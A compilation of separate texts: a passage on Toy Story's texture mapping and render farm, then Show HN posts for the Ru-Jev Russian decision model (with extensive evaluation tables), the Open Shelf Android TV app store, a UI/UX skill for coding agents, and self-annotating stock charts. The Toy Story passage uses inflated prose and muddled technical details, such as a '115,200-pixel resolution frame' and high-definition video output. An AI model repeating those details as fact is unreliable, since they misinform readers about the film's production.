 The critical visual threshold that separated Toy Story from early experimental computer graphics was the implementation of sophisticated texture mapping and procedural noise filtering. Early 3D rendering suffered from a stark flaw known as absolute digital plasticity—where surfaces appeared perfectly smooth, sterile, and visually synthetic. To anchor the film in an optically undeniable reality, the technical direction team had to systematically introduce micro-imperfections into the digital asset files.
 Procedural Scratches and Micro-Specular Variance
 To break the artificial perfection of the digital models, software engineers applied multi-layered texture maps containing custom bump-mapping data and specular opacity controls. For characters like Buzz Lightyear, the surface maps were intentionally injected with digital scuffs, microscopic scratches, and uneven plastic mold lines. This procedural variation altered the light reflection across the object’s geometry, preventing the specular highlight from shining uniformly.
 The camera tracked these close-ups with tight, high-contrast framing paradigms, catching how the virtual lighting fields broke against the distressed surfaces. This meticulous attention to superficial wear transformed the synthetic characters from flat geometric shapes into tactile, weathered objects that carried historical presence on screen, satisfying the strict sensory requirements of contemporary cinematic presentation without relying on a single millimeter of physical photographic film stock.
Computational processing: The massive custom render farm compiling final high-definition video frames across centralized data distribution networks. Data Pipeline Management and Render Farm Latency
 The final processing hurdle of the production cycle focused on data throughput and compilation architecture. The computational requirements to output a single 115,200-pixel resolution frame averaged between 45 minutes and 30 hours, depending on the geometric complexity and shadow depth of the scene. To compile the entire film, Pixar assembled a custom render farm composed of 117 centralized SPARCstation workstations operating continuously across localized network grids.
 This data pipeline required strict code optimization to prevent memory overflows and server core failures. Digital assets had to be dynamically loaded and unloaded from volatile memory caches based on the camera’s active field of view. The resulting computing framework demonstrated that feature-length digital cinematography was entirely viable, marking the absolute death of flat cell animation and birthing a new era of computational visual storytelling that remains the foundational infrastructure of modern Hollywood spectacle.

title: Show HN: Ru-Jev – an open model that scores caller-supplied options on CPU (MIT)
author: vladimirbesk
body:
# Ру-Жев (Ru-Jev) v1.3 

Do not use the standard zero-shot pipeline. The call `pipeline("zero-shot-classification", model="besktech/ru-jev")` neither fails nor works: it returns numbers drawn from a randomly initialized head, and they change on every load. Load the model with the snippet below.

Open, Russian-first typed-decision model. It does not generate text. Given a context and a set of candidate options, it returns a calibrated probability over the options and picks one. It covers three decision shapes: yes/no, choice from options, and ordinal scale. It is a compact encoder (mmBERT-base, 307M), so it runs on CPU and can be deployed inside a closed perimeter.

- Project page: https://ru-jev.besk.tech
- Demo with precomputed examples: https://huggingface.co/spaces/besktech/ru-jev-demo
- Training and evaluation code: https://github.com/beskvladimir-create/ru-jev

Earlier releases are kept on branches: `v1.1` and `v1`. Load one with `revision="v1.1"` if you depend on its exact behaviour.

The inference widget is switched off on purpose, and the stock pipelines do not work either. This is a backbone plus a separate scoring head, not a standard sequence-classification checkpoint. Every stock pipeline loads the checkpoint through `AutoModelForSequenceClassification`, which quietly initializes a fresh head instead of loading `head.safetensors`, and then scores with it. On the example below the standard zero-shot pipeline put at most 0.44 on the right option where this model puts 0.95, and over three loads of the same code it named a different top option twice. Use the snippet below.

Not affiliated with TypeSafe AI. Not trained on Jev outputs. Ru-Jev is a Jev-class typed-decision model built independently: the scoring head is trained from random initialisation and the mmBERT-base backbone is fine-tuned along with it, on open, human-labelled datasets only. No closed decision API was called, distilled or used as a label source at any point. The name is a play on the category, not a claim of compatibility or endorsement.

## What changed since v1.1 

v1.1 read the option text, which is the point of the design, but it read it narrowly. It had learned the exact wordings its training data used. Rename a category and accuracy fell off a cliff. A scenario called `погода` was routed correctly in 0.956 of cases, and the same scenario called `вэзер` in 0.633. Worse, the confidence did not fall with it: on the jargon wording v1.1 still reported 0.754 mean confidence against 0.633 accuracy, a gap of 0.121, against 0.030 for v1.3. The probability stopped carrying information exactly where a caller needed it most.

v1.3 ships every fixed option set in several wordings and draws one per example, so the model has to read an option instead of recognising it. For the routing tasks that includes the English key written in Cyrillic and a clipped form of it, generated by rule.

The same 1,000 routing questions were then asked over and over with the label wording varied and nothing else. Two candidate-set sizes are reported, because the gap depends on the size in different ways for different vocabularies and a probe at one size alone can misstate the effect: five candidates drawn from the eighteen categories, which is what earlier versions of this card reported, and all eighteen candidates at once. Chance is 0.20 and 0.056.

| Option wording, example for `weather` | Status | v1.1, 5 | v1.3, 5 | v1.1, 18 | v1.3, 18 |
| --- | --- | --- | --- | --- | --- |
| Russian word, `погода` | training style, both releases | 0.956 | 0.960 | 0.883 | 0.892 |
| English key, `weather` | training style, both releases | 0.957 | 0.962 | 0.894 | 0.900 |
| Russian phrase, `прогноз погоды` | training style, v1.3 only | 0.881 | 0.957 | 0.703 | 0.885 |
| Descriptive sentence | held out | 0.939 | 0.958 | 0.848 | 0.878 |
| Department name, `метеослужба` | held out | 0.835 | 0.869 | 0.632 | 0.733 |
| Anglicism jargon, `вэзер`, all 18 labels | held out | 0.633 | 0.855 | 0.431 | 0.640 |
| Anglicism jargon, 15 clean labels | held out | 0.624 | 0.838 | 0.427 | 0.595 |
| Anglicism jargon, 11 strict labels | held out | 0.550 | 0.786 | 0.328 | 0.470 |
| Office slang, `синоптик`, all 18 | held out | 0.648 | 0.780 | 0.428 | 0.476 |
| Office slang, 14 strict labels | held out | 0.595 | 0.761 | 0.369 | 0.419 |
| Abbreviation, `ПОГ`, 17 clean labels | held out | 0.420 | 0.360 | not scored | |
| Opaque code, `ПГД`, 9 strict labels | held out | 0.135 | 0.168 | 0.018 | 0.061 |
| Code identifier, `WEATHER_SCN` | contains the trained key | 0.856 | 0.889 | not scored | |

The first two rows are controls, not results. The Russian word and the English key are the wordings both releases trained on: the bench vocabulary for them is the training style itself, taken from the same table in the data builder. Those two rows measure recall of a trained form, and the gap near zero is what a control should show. The Russian phrase is a training style for v1.3 and not for v1.1, so its gap is expected by construction and is not evidence of robustness either. Only the rows marked held out speak to generalisation.

Two caveats on the held-out rows. An intent key begins with its scenario name, so three of the eighteen jargon labels coincide with what the transliteration rule produces and reach training as a first word; the clean slice drops those three and the strict slice drops every label with any exact or prefix relation to a training option. The rules were not tuned against this test vocabulary, and the vocabulary is the older of the two: it was committed six hours and thirty-four minutes before the rules. Figures from different slices measure different label sets, so one never belongs beside another.

What the augmentation helps with. Training a label in several surface forms helps on held-out wordings made of words, ordinary or borrowed, including kinds of words that were never in training at all: jargon gains +0.235 with five candidates and +0.142 with eighteen on the strict slice, office slang +0.166 and +0.050, department names +0.034 and +0.101, descriptive sentences +0.019 and +0.030. The direction is the same in all fourteen word-vocabulary cells.

What it does not help with. On three-letter abbreviations v1.3 is not better: -0.024 on all labels and -0.060 on the clean slice. Opaque codes are unreadable for both releases, with v1.1 below chance and v1.3 at chance on the strict slice with eighteen candidates. Code identifiers such as `WEATHER_SCN` contain the trained key and are easy for both, so they are not treated as a test of robustness. Where the label string carries little of its meaning, several surface forms in training buy nothing.

Confidence does not follow accuracy here. With five candidates the count of confident errors falls on jargon, from 110 to 62 per 1,000 on the strict slice. With eighteen it rises, on jargon from 79 to 109 on all labels and on slang from 151 to 191 on the strict slice, because the augmented release is more confident overall and more of its errors cross the 0.8 threshold. On abbreviations it rises from 77 to 118. The augmentation does not by itself make confidence safer on unfamiliar wording. A deployment that invents its own label vocabulary should refit the temperature on its own decisions; `scripts/fit_temperature.py` in the code repository does that on a few hundred rows and reports whether there were enough of them.

Thresholding tells a kinder story than the raw count does. In most cells where accuracy improves, the area under the risk-coverage curve falls, so a caller who answers only above a confidence threshold is better served: on strict jargon it goes from 0.235 to 0.078 with five candidates and from 0.452 to 0.418 with eighteen, and on strict slang from 0.223 to 0.121 with five candidates. The exception is slang on all labels with eighteen candidates, where it rises from 0.354 to 0.395. So the release is easier to threshold on unfamiliar wording while being worse at the fixed 0.8 cut, and which of those matters depends on whether a threshold is tuned.

These are two trained models, not an ablation. The two releases differ in more than the label augmentation, and each was trained once. The results above are consistent with the augmentation being the cause, and a later attempt to isolate it by retraining the recipe on other seeds was void because the mixture shipped to that run predated the augmentation commit. Nothing here is a controlled ablation.

Significance is exact McNemar on the paired questions with a Holm correction over the 23 held-out cells, and the interval resamples labels before questions. The five-candidate columns for slang and opaque codes are obtained by renormalising the eighteen-candidate scores over the same five candidates the main bench uses, which is exact for Ru-Jev because every candidate is scored in its own pass. Raw counts, per-label tables and the analysis script are in the code repository under `results/analysis/`.

## Results 

v1.3 on its own validation split, 13,373 decisions, with the temperature fitted on the other half:

| Metric | Value |
| --- | --- |
| Accuracy (micro) | 0.823 |
| ECE, temperature fitted on a disjoint half | 0.0185 |
| ECE, temperature fitted on this same data | 0.0159 |
| Shipped temperature | 1.8640 |

Two ECE figures, because the number depends on where the temperature came from. Fitting and scoring on the same rows is in-sample and optimistic. The first figure is what to expect on new data of the same kind, and it is the one to quote.

### Why most of the comparison with v1.1 had to be thrown away 

Two things stood between the two releases, and both were found by checking rather than by reasoning.

The data builder carved each task's validation slice by shuffling that task's pool with a module-level random generator, seeded once and consumed by every other random call in the file. Adding two label styles to one task changed how many bits those draws consumed, the stream diverged from that point, and every task below it in the build order received a different slice. Measured: of v1.3's validation rows, 90.3% of rucola and 89.8% of mera_qa had been in v1.1's training set, along with 47.2% of georeview and 21.7% of toxicity.

The second is the point of this release working against its own measurement. Where v1.3 ships an option set in several wordings, its validation rows carry wordings v1.1 never trained on. Scoring v1.1 there measures how well it handles renamed options, which is a real question but not the question a per-task accuracy table is asking. Comparing by text alone hides this, so the rows were compared by text and option wordings together.

| Task | Same rows | Same rows and same option wordings |
| --- | --- | --- |
| terra, danetqa, russe, rwsd, parus, rcb | 100% | 100% |
| rureviews | 100% | 19.6% |
| massive_scenario, massive_intent | 63% | 0% |
| mera_qa | 10.6% | 10.6% |
| rucola | 9.7% | 9.7% |
| georeview | 5.3% | 1.5% |
| toxicity | 2.4% | 0.4% |

What this cost in published claims is worth stating plainly. An early draft of this card read rucola 0.909 against 0.647 and mera_qa 0.939 against 0.596, both of which were v1.1 being scored on its own training data. It also read toxicity 0.722 against 0.954 as a gain in capability, when v1.1 scores 0.961 on toxicity against the wordings it trained on; 0.722 is that same model with the labels renamed. None of those three numbers belonged in a per-task accuracy table.

The builder now seeds each carve from the task name, so a wording change in one task can no longer move the split in another.

### Six tasks measured on identical rows with identical option wordings 

| Metric, six comparable tasks, all 10,157 decisions | v1.1 | v1.3 |
| --- | --- | --- |
| Correct answers | 8,120 | 8,120 |
| Accuracy (micro) | 0.7994 | 0.7994 |
| Fitted temperature on these rows | 2.0054 | 1.5593 |
| ECE after each model's own temperature | 0.0190 | 0.0191 |

Accuracy does not depend on the temperature, so it is reported on all 10,157 decisions rather than on a split half. The two releases land on the same count: 8,120 correct out of 10,157 each. They do not get the same rows right. They disagree on 1,680 of them, 840 where only v1.1 is right and 840 where only v1.3 is. One standard error on the difference is 0.0056, and the difference is +0.0000.

The temperature and ECE rows are the mean over 25 random half-splits, fitting on one half and scoring the other. v1.3 needs a lower temperature in 25 of 25 splits, with the two ranges not overlapping (1.942 to 2.098 against 1.500 to 1.604), so its raw scores are genuinely less overconfident. The ECE that remains after each model gets its own temperature is the same for both: the difference averages +0.0001 and runs from -0.0063 to +0.0109, favouring v1.3 in 14 of 25 splits. An earlier version of this card reported 0.0172 against 0.0160 from a single fixed split and called v1.3 better calibrated here. On a different split the sign flips, so that claim is withdrawn.

The split seed is recorded as `SPLIT_SEED = 20261105` in `scripts/calib.py`. An earlier implementation shuffled its index list in place without resetting it between splits, so each split was applied to the permutation left by the previous one and the result depended on the order of rows in the file. These figures come from the corrected code; the shift it caused is in the third decimal and turns over nothing.

| Task | v1.1 | v1.3 | n |
| --- | --- | --- | --- |
| russe (word sense) | 0.822 | 0.824 | 8,505 |
| danetqa (yes/no) | 0.742 | 0.753 | 821 |
| terra (entailment) | 0.775 | 0.733 | 307 |
| parus (choice) | 0.680 | 0.590 | 100 |
| rcb (3-way NLI) | 0.450 | 0.509 | 220 |
| rwsd (coreference) | 0.564 | 0.480 | 204 |
| all six | 0.7994 | 0.7994 | 10,157 |

On the only ground where the two releases can be compared directly, they are the same model for accuracy. v1.3 is not more accurate than v1.1 and this release does not claim to be. What it is, is far less dependent on how the options are worded, and less overconfident before calibration, needing a noticeably lower temperature on identical rows. After each model is given its own temperature, the calibration error that remains is the same for both.

One caveat on this table. `russe` supplies 8,505 of the 10,157 decisions, 84% of the total, so the micro average is mostly a statement about one word-sense task. The five smaller tasks move in both directions and none of them moves far enough to matter against its own standard error.

### The remaining seven tasks, each model on its own held-out slice 

No shared rows exist for these, so each column is that model's own validation slice scored with its own option wordings. That is an honest measurement of each model separately and a weak comparison between them.

| Task | v1.1, own slice | v1.3, own slice | n |
| --- | --- | --- | --- |
| massive_intent (60 labels) | not measured | 0.960 | 3,000 |
| massive_scenario (18 labels) | not measured | 0.955 | 3,000 |
| toxicity | 0.961 | 0.954 | 3,000 |
| rureviews (sentiment) | not measured | 0.774 | 3,000 |
| rucola (acceptability) | 0.650 | 0.647 | 1,344 |
| georeview (5 levels) | 0.629 | 0.631 | 3,000 |
| mera_qa (reasoning) | 0.522 | 0.596 | 245 |

## Four epochs were trained and the third was shipped 

The run went four epochs and each one was kept. The fourth overfits: training loss fell to 0.085 while validation loss rose from 0.483 to 0.820, and a temperature fitted on it comes out at 3.92, which is what overconfidence looks like as a number.

| Epoch | Training loss | Validation loss | Validation accuracy |
| --- | --- | --- | --- |
| 1 | 0.6029 | 0.5054 | 0.7536 |
| 2 | 0.4336 | 0.4576 | 0.7920 |
| 3 | 0.2714 | 0.4831 | 0.8181 |
| 4 | 0.0849 | 0.8204 | 0.8139 |

The shipped weights are the third epoch. Had only the last checkpoint been kept, the released model would have been the worse one and nothing would have shown it.

## Name your options carefully 

The model reads the option text, so wording still matters, just much less than it did.

| Option wording | v1.1 accuracy | v1.1 confident errors | v1.3 accuracy | v1.3 confident errors |
| --- | --- | --- | --- | --- |
| Russian word, `погода` | 0.956 | 20 | 0.960 | 19 |
| English key, `weather` | 0.957 | 16 | 0.962 | 26 |
| Descriptive sentence | 0.939 | 14 | 0.958 | 16 |
| Russian phrase, `прогноз погоды` | 0.881 | 34 | 0.957 | 14 |
| Department name, `метеослужба` | 0.835 | 54 | 0.869 | 52 |
| Jargon, `вэзер` | 0.633 | 85 | 0.855 | 44 |

The confident-error columns count answers that were wrong while above 0.8 confidence, out of a thousand questions per row. They are measured with five candidates; with all eighteen at once the count rises for v1.3 on jargon and on slang, because it is more confident overall.

Three rules follow from the wording bench above.

Write options as ordinary words that describe the category. That is where several surface forms in training actually pay: on held-out wordings made of words, including borrowed words and office slang the model never saw.

Do not use abbreviations or opaque codes as option text. `ПОГ` and `ПГД` for the weather category are not better read by v1.3 than by v1.1, and opaque codes sit at chance for both. A code that contains a readable key, such as `WEATHER_SCN`, works for the same reason the key does, so it is the key that is doing the work, not the code.

Measure your own vocabulary and refit the temperature on it. `scripts/robustness.py` scores a label vocabulary of your own, and `scripts/fit_temperature.py` fits a temperature on a few hundred of your own decisions and says whether there were enough of them. Accuracy does not depend on the temperature, so refitting changes only the number next to the answer, but on unfamiliar wording that number is where this release is least trustworthy.

## Withholding an answer 

A calibrated probability is worth something only if the caller acts on it. Set a confidence threshold, answer above it and send the rest to a human. The serving API takes a `threshold` and returns the withheld decisions in a review list.

| Share answered | Confidence threshold | Accuracy on those | Errors per 1000 |
| --- | --- | --- | --- |
| 50% | 0.85 | 0.967 | 33 |
| 60% | 0.77 | 0.947 | 53 |
| 70% | 0.69 | 0.921 | 79 |
| 80% | 0.61 | 0.892 | 108 |
| 90% | 0.54 | 0.859 | 141 |
| 100% | 0.23 | 0.823 | 177 |

## Limitations 

Hard reasoning tasks with small training sets remain weak and are not fixed by anything in this release: `rwsd` coreference, `rcb` three-way inference and `parus` causal choice all train on fewer than a thousand rows each. For a 307M encoder that is a size limit, not a data-wording limit. A larger backbone was tried once, xlm-roberta-large at 560M, and lost to v1.

Those same tasks are where the two releases differ most in the comparable table, and in both directions: v1.3 is 0.059 above v1.1 on `rcb` and 0.084 and 0.090 below it on `rwsd` and `parus`. Their validation slices hold 220, 204 and 100 rows, so one standard error is roughly 0.03 to 0.05 and none of those three gaps is far outside it. Read them as scatter, not as a trend, and do not plan around either direction.

The model answers only within the option set it is given. It cannot say that none of the options fit, so include an explicit "none of these" option when that outcome is possible.

Probabilities are calibrated in aggregate, not per task. A single temperature serves all thirteen tasks, so a task far from the mix average can be systematically overconfident or underconfident.

Every training recipe here was run once. The wording-robustness gap is large enough that seed noise is unlikely to account for it, but it has not been measured across seeds, and the small per-task differences in the comparable table certainly should not be read as reproducible.

Robustness to wording was measured systematically on the choice-from-options shape only, using the eighteen-way routing task. For yes/no there is a single renaming test, on toxicity, reported above. The ordinal-scale shape has no wording test at all, and it is the shape where renaming a level could also disturb the order, so nothing here should be assumed to carry over to it.

## Speed on CPU 

Apple M4, float32, median of 25 runs after 5 warm-up runs, nothing else running on the machine. Latency is the whole decision: tokenisation, the forward passes and the softmax.

| Candidates | Ru-Jev v1.3 | Laya | Ratio |
| --- | --- | --- | --- |
| 2 | 18.5 ms | 15.5 ms | 1.19 |
| 5 | 32.8 ms | 17.8 ms | 1.84 |
| 18 | 73.8 ms | 30.5 ms | 2.42 |

Ru-Jev scores each (context, option) pair in its own forward pass, so the cost of a decision grows linearly with the number of candidates, by roughly 4 ms per candidate on this machine. That is also why option order is not an input to it. Laya reads all options in one pass, so its cost is almost flat in the number of candidates and order is an input. Ru-Jev is slower in both settings and no speed advantage is claimed here.

## Usage 

```python
import json, torch, torch.nn as nn
from huggingface_hub import hf_hub_download
from safetensors.torch import load_file
from transformers import AutoModel, AutoTokenizer

REPO = "besktech/ru-jev"

class Scorer(nn.Module):
    def __init__(self, repo):
        super().__init__()
        self.backbone = AutoModel.from_pretrained(repo)
        self.head = nn.Linear(self.backbone.config.hidden_size, 1)
        self.head.load_state_dict(
            load_file(hf_hub_download(repo, "head.safetensors")))

    def forward(self, ids, mask):
        cls = self.backbone(input_ids=ids, attention_mask=mask).last_hidden_state[:, 0]
        return self.head(cls).squeeze(-1)

calib = json.load(open(hf_hub_download(REPO, "calibration.json")))
T = calib["temperature"]
tok = AutoTokenizer.from_pretrained(REPO)
model = Scorer(REPO).eval()

context = "Приложение падает при входе после обновления."
options = ["техническая проблема", "оплата, счета и возвраты", "продажи"]

with torch.no_grad():
    enc = tok([context] * len(options), options, truncation=True,
              max_length=calib["max_len"], padding=True, return_tensors="pt")
    probs = torch.softmax(model(enc["input_ids"], enc["attention_mask"]) / T, dim=0)

for option, p in zip(options, probs.tolist()):
    print(f"{p:.3f}  {option}")

```

Divide by the shipped temperature before the softmax. Without it the probabilities are overconfident and the threshold logic above does not hold.

## Training data 

Thirteen tasks from open Russian datasets, 143,991 training and 26,746 validation decisions. Russian SuperGLUE (`terra`, `danetqa`, `russe`, `rwsd`, `parus`, `rcb`), RuCoLA, MERA (`ruopenbookqa`, `ruworldtree`), MTEB Russian (`RuReviewsClassification`, `GeoreviewClassification`, `amazon_massive_intent`, `amazon_massive_scenario`) and `rudetoxifier_data`. Each source keeps its own licence; see `DATASETS.md` in the code repository.

Every fixed option set ships in several wordings. The builder verifies that all thirteen tasks are present and refuses to write the data if any is short. That check exists because an earlier run silently trained on eleven.

## Citation 

The two releases are compared in the preprint arXiv:2611.08439. The code, the per-row scores and the evaluation scripts behind every figure in it are archived at Zenodo under 10.5281/zenodo.23986846, which always resolves to the latest version. Cite 10.5281/zenodo.23986847 for the exact version the paper was written against.

```bibtex
  archivePrefix = {arXiv},

}

  publisher = {Zenodo},

```

# wingedpanther/openshelf

An app store for Android TV that installs open-source TV apps from GitHub releases

- Stars: 0

## Top Contributors

---

## README

# Open Shelf

An app store for Android TV that lists open-source TV apps from GitHub and installs them from each project's releases, using only the remote.

Google Play on TV only carries apps that publish there. Plenty of good TV apps only live on GitHub, where installing one means a phone, a download link and a guess at which APK fits your box. Open Shelf does that part for you.

Open Shelf on Android TV

Watch the full-quality video

## What it does

- Lists about 2,900 Android TV apps from GitHub, in 18 categories
- Every app in the list declares TV support in its manifest and ships an APK in its latest release
- Search by name or by what an app does, like "video player" or "launcher"
- Picks the APK that matches your TV's CPU
- Checks the signing key before installing an update, and holds the update if the key changed
- My Apps shows what's installed, with updates for apps in the catalog
- Light and dark themes, and a choice of accent colours
- IPTV players and debrid or Stremio streaming clients are hidden by default, with a switch in Settings to show them

## Screenshots

| | |
|---|---|
| Discover | Categories |
| Discover | Categories |
| A category | An app page |
| A category | An app page |
| Search | Settings |
| Search | Settings |

## Install

You need an Android TV, Google TV, Fire TV or other Android box running Android 9 or newer.

1. Download the latest `OpenShelf-x.y.z.apk` from Releases.
2. Sideload it with an app like Downloader, or from a computer with `adb install OpenShelf-x.y.z.apk`.
3. The first time you install an app, Android asks you to allow installs from Open Shelf. Allow it once.

## The catalog

The app list is built from public GitHub data and ships inside the APK. An app is included when:

- the repository isn't a fork
- its latest release has an APK, published in the last 3 years
- that APK's manifest has the Android TV launcher entry

Apps with fewer than 10 stars stay out of browsing, but search still finds them by their exact name.

## Build

Needs JDK 17 or newer and the Android SDK. Point `local.properties` at the SDK (`sdk.dir=...`), then:

```
./gradlew assembleRelease
```

Release builds are signed with the debug key unless a `keystore.properties` file sits in the project root with `storeFile`, `storePassword`, `keyAlias` and `keyPassword`.

title: Show HN: Design guidance and UI checks for coding agents
author: smokeeaasd
body:
# smokeeaasd/flawless-ui-ux

A UI/UX skill for coding agents to build distinctive, usable interfaces.

- Stars: 64
- Forks: 1
- Watchers: 64
- Open issues: 0
- License: MIT License
- Default branch: main
- Created: 2026-11-03T14:36:42Z

## Languages

- CSS
- HTML
- JavaScript
- Shell

## Topics

- accessibility
- agent-skills
- ai-agents
- anti-slop
- codex
- design-systems
- frontend
- opencode
- ui-design
- ux-design

## Top Contributors

- smokeeaasd (31 contributions)

---

## README

 
 
 

 
 Build and refine interfaces around your product's audience, content, and identity.
 

 
 
  
 
  
 
  
 
  
 
  
 
  
 
  
 
  
 
  
 
  
 
  
 
 

 
 
 
 
 
 

 
 Install ·
 Use the skill ·
 How it works ·
 Inspect and verify ·
 Docs 
 

## Install

From your project directory, run one command with your preferred package manager:

```bash
# npm
npx flawless-ui-ux@latest install

# pnpm
pnpm dlx flawless-ui-ux@latest install

# Bun
bunx flawless-ui-ux@latest install
```

Requires **Node 22.12+**. In a terminal, choose **project or global scope**, select **one or more agents**, and **confirm the destinations** before copying. Use Space to select and Enter to continue. Ctrl+C cancels before installation files are written.

Explicit flags run directly:

```bash
npx flawless-ui-ux install --codex
npx flawless-ui-ux install --codex --devin
npx flawless-ui-ux install --claude-code --global
npx flawless-ui-ux install --project ./app
npx flawless-ui-ux install --yes
```

`--yes` skips the menu and uses the defaults when no other flags are supplied: all supported agents in the current project. JSON output, CI, and non-terminal execution remain noninteractive. Use `--format json` for machine-readable output.

 
 Install the skill through skills.sh 

```bash
npx skills add smokeeaasd/flawless-ui-ux --skill flawless-ui-ux
```

This installs the skill through the Skills CLI. Its runtime requirements and agent selection follow that installer. The inspection CLI is available separately through the npm commands in this guide.

 

 
 Install from a checkout with Bash 

```bash
bash /absolute/path/flawless-ui-ux/install.sh --codex --project
```

The Bash alternative requires `--project` for local installation; its default is global. Windows users need Git Bash or WSL.

 

## Use the skill

Describe the interface you need and name the skill:

```text
Use the flawless-ui-ux skill to build a financial dashboard for freelancers.
```

In Codex, invoke `$flawless-ui-ux`. Hosts with slash commands use `/flawless-ui-ux`; Pi uses `/skill:flawless-ui-ux`. You can also request the skill by name through your host's skill mechanism. Start a new session after installation if discovery needs to refresh.

Continue in the same conversation as the interface develops:

| Task | Example request |
|---|---|
| Create | Build a landing page for an app that coordinates deployments and incident handoffs. |
| Redesign | Redesign this account screen for mobile using the supplied brand palette. Preserve its content and behavior. |
| Refine | Give the main action more presence while preserving the page's visual character. |
| Focus | Improve typography and spacing. Preserve wording, colors, and functionality. |
| Review | Review this dashboard for readability, navigation, accessibility, and repeated generic patterns. Report findings without editing files. |

## How it works

**The skill guides design and implementation.** It connects product context to composition, typography, color, density, imagery, and interaction. Focused references support creation, redesign, refinement, and review in your existing stack.

**Refinement develops the intended character.** An interface may need more presence, less competing emphasis, or a more consistent finish. The right intervention depends on the content and task. Generic copy, repetitive decoration, and familiar patterns are reviewed in context, alongside usability and accessibility.

**The CLI checks the implementation.** Collect project context, inspect selected source files or a running interface, and compare the result after corrections. Your agent makes the changes; the CLI provides observations and records what was actually checked.

## Inspect and verify

Use the CLI directly, or ask your agent to include these checks in its work. Replace `npx` with `pnpm dlx` or `bunx` throughout.

### Start with context and source

```bash
npx flawless-ui-ux context --project . --format json
npx flawless-ui-ux inspect --project . --source src/App.tsx --format json
```

### Check the running interface

Start your app and prepare the browser once:

```bash
npx playwright@1.64.1 install chromium
# or: pnpm dlx playwright@1.64.1 install chromium
# or: bunx playwright@1.64.1 install chromium
```

Inspect the actual development-server URL and save a baseline:

```bash
npx flawless-ui-ux inspect --project . --source src/App.tsx --url http://localhost:5173 --output ../app-before --format json
```

After corrections, repeat the saved scope:

```bash
npx flawless-ui-ux verify ../app-before/run.json --output ../app-after --format json
```

The comparison separates **persistent**, **new**, and **no-longer-observed** findings. Missing confirmed targets and changed conditions remain unverified.

| Area | Evidence collected |
|---|---|
| Accessibility | Selected axe contrast and accessible-name rules, including incomplete results for review |
| Text and layout | Computed font sizes and horizontal overflow at the sampled widths |
| Assets and runtime | Visible broken images and uncaught JavaScript errors |
| Copy and icons | Exact repeated phrases and arrow cues for contextual review |
| Source | Literal pixel font sizes and arrow/icon cues in selected files |

 
 Scope, artifacts, and verification limits 

- Default viewport samples are **1440 × 900** and **390 × 844**. Repeat `--viewport WIDTHxHEIGHT` to choose others.
- Repeat `--source` for additional files, or use `--selector` to inspect a region.
- Use `--browser-executable` or `FLAWLESS_BROWSER_EXECUTABLE` to select an installed compatible Chromium. Keep browser conditions consistent between runs.
- With `--output`, a new directory receives `run.json` and available screenshots; its parent must exist. Existing output directories are preserved. Without it, results go to stdout.

These samples do not establish full WCAG conformance, complete keyboard journeys, business-flow correctness, or visual quality. Small text and repetition require context. Inspection does not edit files, start servers, download browsers, or submit forms.

CLI exit codes: `0` for completed coverage without confirmed errors, `1` for completed coverage with confirmed errors, and `2` for invalid input or incomplete requested coverage. The installer also returns `0` when confirmation is declined and `130` when a prompt is interrupted.

 

## Installation notes

Existing files, local changes, and links are preserved. Review or remove an old installation before reinstalling. Host rules, plugins, permissions, and trust settings stay under your control.

The twelve supported agents use **five project copies** of the same skill. Hosts that discover `.agents/skills` share one copy; others use their native directories.

 
 Host-specific details 

- **Grok Build:** project skills become available after folder trust.
- **DeepSeek Harness:** install from the nearest Git root, or the working directory without Git. Custom provider roots may change discovery.
- **Kiro:** custom agents can reference skills through `skill://` resources.
- **Global paths:** honor each host's configuration directory and overrides. Devin uses `APPDATA` on Windows and `XDG_CONFIG_HOME` elsewhere.

See the installation contract for exact paths and the testing guide for recorded compatibility evidence and pending checks.

 

## Development

```bash
bun install --frozen-lockfile
bun test
```

Bun is the development toolchain; the published CLI runs on Node. See testing for browser fixtures, packaging checks, and Windows/Ubuntu CI.

## Documentation

- Workflow guide — creation, redesign, refinement, and review
- CLI contract — installation paths, options, context, and comparison limits
- Product contract — philosophy and scope
- Architecture — skill, project context, and inspection core
- Manual evaluations — reproducible tasks and evidence criteria
- Changelog

## License

MIT.

Agent icons are provided by Lobe Icons, using theme-aware images pinned to a specific revision. Product names and marks belong to their respective owners. Badges use Shields.io. Monthly downloads refer to the npm CLI package.

title: Show HN: Self-Annotating Stock Charts
author: regnull
body: Most stock charts work in a similar way - they give you a bunch of tools to draw lines and patterns on a chart. This is fine, and I assume that advanced traders enjoy drawing on the chart. But it's also annoying, and seems arbitrary sometimes.So I created stock charts that annotate themselves. The process has two stages:First, the algorithm goes through the daily candles and identifies the structure: support and resistance zones, trendlines, volume spikes, etc.Then, an LLM models understands the relative importance of the structure components, decides which ones to include, and annotates them.Finally, it lays out the possible future moves: base case, bull and bear cases.It's included in Portfolio Genius, the AI investment manager I'm building, and it's available free without signup here: https://portfoliogenius.ai/features/ai-annotated-charts
